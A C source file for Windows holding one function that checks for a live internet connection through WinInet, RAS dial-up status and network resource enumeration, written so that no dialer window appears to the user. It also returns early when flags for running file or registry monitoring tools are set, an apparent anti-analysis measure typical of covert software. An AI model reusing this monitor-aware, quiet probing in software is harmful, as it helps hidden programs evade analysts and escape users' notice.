#include <windows.h>
#include <ras.h>
#include <winnetwk.h>

#include "defines.h"
#include "macros.h"
#include "types.h"
#include "globals.h"

int checkForNet(){//returns 0 if no connection, else ~0
/*
	must check if the computer is actually connected to the internet before
	using any of the winsock functions; else the Dialer would pop-up.
	'WinInet.InternetGetConnectedState' returns 'true' ('connected') even if
  the computer may not actually be connected; (for special ie settings)...
*/

	p_RasEnumConnections	_RasEnumConnections;
	p_RasGetConnectStatus	_RasGetConnectStatus;
	p_WNetOpenEnum			_WNetOpenEnum;
	p_WNetEnumResource		_WNetEnumResource;
	p_WNetCloseEnum			_WNetCloseEnum;
	p_InternetGetConnectedState	_InternetGetConnectedState;

	HMODULE			hDLL;
	RASCONN			rasConn;
	RASCONNSTATUS	rasConnStatus;
	HANDLE			hWNetEnum;
	NETRESOURCE		netRes;
	DWORD			bufSize;
	DWORD			num;
	int				retVal=0;

#ifndef noChk4FileMon
#ifndef noChk4RegMon
	if (fileMonRunning || regMonRunning)
		return 1;
#endif
#endif

  if (hDLL=LoadLibrary("WININET.DLL")){
    if ((_InternetGetConnectedState=(p_InternetGetConnectedState)GetProcAddress(hDLL,"InternetGetConnectedState"))
        && (_InternetGetConnectedState(&num,0))){
		  FreeLibrary(hDLL);
		  /* retVal=~0;
		   * if explorer settings say "Always Connected", this returns connected even if
		   * there really ain't a connection. so now do a "real" check ...
       */
  rasCheck:
		  if (hDLL=LoadLibrary("RASAPI32.DLL")){
			  if ((_RasEnumConnections=(p_RasEnumConnections)GetProcAddress(hDLL,"RasEnumConnectionsA"))
            && (_RasGetConnectStatus=(p_RasGetConnectStatus)GetProcAddress(hDLL,"RasGetConnectStatusA"))){
				  rasConn.dwSize=bufSize=sizeof(RASCONN);
				  rasConnStatus.dwSize=sizeof(RASCONNSTATUS);
				  if (!_RasEnumConnections(&rasConn,&bufSize,&num) && num
              && !_RasGetConnectStatus(rasConn.hrasconn,&rasConnStatus)
              && (rasConnStatus.rasconnstate==RASCS_Connected))
					  retVal=~0;
			  }
			  FreeLibrary(hDLL);
		  }

      if (!retVal){
			  if (hDLL=LoadLibrary("MPR.DLL")){
				  if ((_WNetOpenEnum=(p_WNetOpenEnum)GetProcAddress(hDLL,"WNetOpenEnumA"))
              && (_WNetEnumResource=(p_WNetEnumResource)GetProcAddress(hDLL,"WNetEnumResourceA"))
              && (_WNetCloseEnum=(p_WNetCloseEnum)GetProcAddress(hDLL,"WNetCloseEnum"))
              && _WNetOpenEnum(RESOURCE_GLOBALNET,RESOURCETYPE_ANY,0,0,&hWNetEnum)==NO_ERROR){
						  num=0xffffffff;bufSize=sizeof(NETRESOURCE);
						  if (_WNetEnumResource(hWNetEnum,&num,&netRes,&bufSize)==NO_ERROR)
							  retVal=~0;
						  _WNetCloseEnum(hWNetEnum);
				  }
				  FreeLibrary(hDLL);
        }
      }
		}
	}
  else
    goto rasCheck;
	return retVal;
}